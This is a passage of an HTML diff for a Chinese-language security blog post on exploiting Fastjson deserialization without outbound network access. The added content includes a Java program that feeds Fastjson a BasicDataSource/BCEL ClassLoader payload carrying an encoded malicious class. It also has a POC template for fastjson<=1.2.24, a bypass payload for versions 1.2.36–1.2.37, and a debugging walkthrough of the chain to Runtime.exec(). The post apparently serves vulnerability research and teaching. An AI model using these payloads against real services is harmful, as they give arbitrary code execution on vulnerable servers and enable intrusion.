-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png" alt="image-20211208162850106"></p>
-<p>size &gt;&gt;&gt; 1是移位运算符，这里意思是向右移一位，所以需要size&gt;=2 ，才能进入循环。</p>
-<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#_8">https://paper.seebug.org/1242/#_8</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219840#h2-0">https://www.anquanke.com/post/id/219840#h2-0</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/119008552">https://blog.csdn.net/qq_35733751/article/details/119008552</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211209224654292.png" alt="image-20211209224654292"></p>
+<p>BCEL：将res.txt的字节码复制到driverClassName上。</p>
+<pre><code>import com.alibaba.fastjson.JSON;
+
+public class BCEL &#123;
+    public static void main(String[] args)&#123;
+        String payload2 = &quot;&#123;\n&quot; +
+                &quot;    &#123;\n&quot; +
+                &quot;        \&quot;x\&quot;:&#123;\n&quot; +
+                &quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot; +
+                &quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot; +
+                &quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +
+                &quot;                &#125;,\n&quot; +
+                &quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot; +
+                &quot;        &#125;\n&quot; +
+                &quot;    &#125;: \&quot;x\&quot;\n&quot; +
+                &quot;&#125;&quot;;
+        JSON.parse(payload2);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png" alt="image-20211224093044624"></p>
+<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><pre><code>//fastjson&lt;=1.2.24
+&#123;
+    &#123;
+        &quot;x&quot;:&#123;
+            &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+            &quot;driverClassLoader&quot;: &#123;
+                &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+            &#125;,
+            &quot;driverClassName&quot;: &quot;$$BCEL$$&quot;+ code+&quot;,
+        &#125;
+    &#125;: &quot;x&quot;
+&#125;
+</code></pre>
+<p>@type</p>
+<p>指定的解析类，这⾥即 org.apache.tomcat.dbcp.dbcp2.BasicDataSource ，Fastjson根据指定类去反序列化得到该类的实例。</p>
+<p>driverClassLoader</p>
+<p>指定Classloade为com.sun.org.apache.bcel.internal.util.ClassLoader</p>
+<p>driverClassName<br>设置ClassName为 BCEL… 这种格式后，在 newInstance ⽅法执⾏后被实例化。第⼆个参数 initial 为true时，类加载后将会直接执⾏ static{} 块中的代码</p>
+<h2 id="2-4-调试分析"><a href="#2-4-调试分析" class="headerlink" title="2.4 调试分析"></a>2.4 调试分析</h2><p>在 JSON 反序列化的时候，FastJson 会对 JSON Key ⾃动调⽤ toString() ⽅法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101406330.png" alt="image-20211224101406330"></p>
+<p>经过⼀系列调⽤，⼀步步跟进来到 BasicDataSource 存在⼀个 getConnection</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101721116.png" alt="image-20211224101721116"></p>
+<p>继续跟进 getConnection 函数，他主要调⽤ createConnectionFactory</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101843513.png" alt="image-20211224101843513"></p>
+<p>跟进可以看到在 createConnectionFactory 函数使⽤ Class.forName 加载类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101905153.png" alt="image-20211224101905153"></p>
+<p>在  Class.forName 时，会触发 static 代码块中的代码，从⽽达到任意代码执⾏的⽬的</p>
+<h2 id="2-4-利用链分析"><a href="#2-4-利用链分析" class="headerlink" title="2.4 利用链分析"></a>2.4 利用链分析</h2><pre><code>--&gt; BasicDataSource.getConnection()
+--&gt; createDataSource()
+--&gt; createConnectionFactory()
+--&gt; Class.forName()
+--&gt;...
+--&gt; Runtime.exec()
+</code></pre>
+<p>当Fastjson反序列化 org.apache.tomcat.dbcp.dbcp.BasicDataSource 对象时，⾸先通过 setter ⽅法设<br>置其 driverClassLoader 和 driverClassName 属性，然后会调⽤其 getConnection⽅法 ，⼜最终调⽤了<br>createConnectionFactory ⽅法，其通过 Class.forName ⽅法反射调⽤ driverClassLoader 加<br>载 driverClassName ，并设置是否初始化参数为true，当 Class.forName 第⼆个参数 initial 为true时，<br>类加载后将会直接执⾏static{}块中的代码造成任意代码执⾏。forName⽅法实际最终调⽤了C实现的Native类型的⽅<br>法，分析C源码可知，其底层的加载逻辑仍是调⽤类加载器的loadClass⽅法加载⾃定义类。</p>
+<h2 id="绕过-1-2-36-lt-fastjson-lt-1-2-37"><a href="#绕过-1-2-36-lt-fastjson-lt-1-2-37" class="headerlink" title="绕过 1.2.36&lt;=fastjson&lt;1.2.37"></a>绕过 1.2.36&lt;=fastjson&lt;1.2.37</h2><pre><code>&#123;
+    &quot;name&quot;:
+    &#123;
+        &quot;@type&quot; : &quot;java.lang.Class&quot;,
+        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;
+    &#125;,
+    &quot;x&quot; : &#123;
+        &quot;name&quot;: &#123;
+            &quot;@type&quot; : &quot;java.lang.Class&quot;,
+            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+        &#125;,
+        &quot;y&quot;: &#123;
+            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,
+            &quot;c&quot;: &#123;
+                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+                &quot;driverClassLoader&quot;: &#123;
+                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+                &#125;,
+                &quot;driverClassName&quot;:&quot;$$BCEL$$&quot;+ code+&quot;,
+
+                     &quot;$ref&quot;: &quot;$.x.y.c.connection&quot;
+
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>参考链接：</p>
+<p>P牛知识星球-Java漫谈</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -1075,12 +853,12 @@ queue.add(2);
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections2分析</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">3.5k</span></p>
+    <p><span class="copy-title">Title:</span>Java反序列化-Fastjson不出网利用</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">1.3k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
-    <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-19, 22:29:24</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections2分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/</a>
+    <p><span class="copy-title">Created At:</span>2021-12-18, 22:00:12</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-24, 10:48:28</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" title="Java反序列化-Fastjson不出网利用">http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
